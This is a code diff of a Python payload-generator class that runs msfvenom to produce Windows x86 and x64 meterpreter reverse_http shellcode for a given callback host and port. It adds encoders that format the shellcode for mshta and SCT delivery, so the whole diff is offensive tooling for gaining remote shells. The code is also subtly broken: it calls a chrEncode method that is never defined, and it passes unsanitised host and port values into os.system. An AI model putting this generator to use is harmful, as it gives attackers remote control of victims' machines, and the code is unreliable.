@@ -7,25 +7,48 @@ import base64
 class Generator():
 
 
-	def genShellcode(self, host, port, arch):
+	def genShellcode(self, host, port, arch, shellProcess = None):
 		#TODO fix to use string .format, remove the filewrite
 		code = ''
+		form = 'c'
+
+		if shellProcess == 'hexEncode':
+			form = "c"
+		elif shellProcess == 'decEncode':
+			form = "vba"
+		
 		if (arch  == "x86"):
-			os.system("msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_http LHOST="+host+" LPORT="+port+" -f vba > /tmp/metasploit 2> /dev/null")
-			#os.system("msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST="+host+" LPORT="+port+" -f vba > /tmp/metasploit 2> /dev/null")
-			#os.system("msfvenom --payload windows/exec CMD=\"calc\" -f csharp > /tmp/metasploit 2> /dev/null")
+			os.system("msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_http LHOST="+host+" LPORT="+port+" -f "+form+" > /tmp/metasploit 2> /dev/null")
 		else:
-			os.system("msfvenom -a x86_64 --platform windows -p windows/x64/meterpreter/reverse_http LHOST="+host+" LPORT="+port+" -f vba> /tmp/metasploit 2> /dev/null")
-			#os.system("msfvenom -a x86_64 --platform windows -p windows/x64/meterpreter/reverse_tcp LHOST="+host+" LPORT="+port+" -f vba > /tmp/metasploit 2> /dev/null")
-			#os.system("msfvenom --payload windows/x64/exec CMD=\"calc\" -f csharp > /tmp/metasploit 2> /dev/null")
+			os.system("msfvenom -a x86_64 --platform windows -p windows/x64/meterpreter/reverse_http LHOST="+host+" LPORT="+port+" -f "+form+" > /tmp/metasploit 2> /dev/null")
 
 		with open("/tmp/metasploit", 'rb') as f:
 			code = f.read()
 
-#		print(str(code) + '\n\n')
-		shellcode = re.findall(r"(Array\(((\-|\d).*)\s+|^(\-|\d)(.*?(_|\d\))\s+))", str(code), flags=re.MULTILINE)
+		shellcode = str(code)
+
+		if shellProcess == 'hexEncode':
+			shellcode = self.hexEncode(shellcode)
+		elif shellProcess == 'decEncode':
+			shellcode = self.chrEncode(shellcode)
+
+		return shellcode
+
+
+
+
+	def hexEncode(self, shellcode):
+		#currently used to format mshta based payloads
+		shellcode = "0x" + shellcode[30:-5]
+		shellcode = shellcode.replace("\\\\", ",0")
+		shellcode = shellcode.replace("\"\\n\"", "\n")
+
+		return shellcode
+
+	def decEncode(self, shellcode):
+		#currently used for SCT based payloads
+		shellcode = re.findall(r"(Array\(((\-|\d).*)\s+|^(\-|\d)(.*?(_|\d\))\s+))", str(shellcode), flags=re.MULTILINE)
 		shellcode = ''.join(i[0].replace('', '') for i in shellcode)
-#		print(shellcode + '\n\n')
 
 		k = shellcode.rfind(")\\r\\n\\n\\t")
 		shellcode = shellcode[:k+5]
@@ -43,15 +66,6 @@ class Generator():
 					even = even<<1
 		shellcode = shellcode[:-4]	
 			
-#		shellcode = shellcode.replace(" _", '')
-#		shellcode = shellcode.replace("\\r", '\r')
-#		shellcode = shellcode.replace("\\n", '\n')
-		
-#		print(shellcode + '\n\n')
-		#self.shellcode = str(base64.b64encode(code))
-		#self.shellcode = str(code)
-		#self.shellcode = self.shellcode.replace(self.shellcode[:2], '')
-		#self.shellcode = self.shellcode[:-1]
-		
+		return(shellcode)
 
-		return shellcode
+		
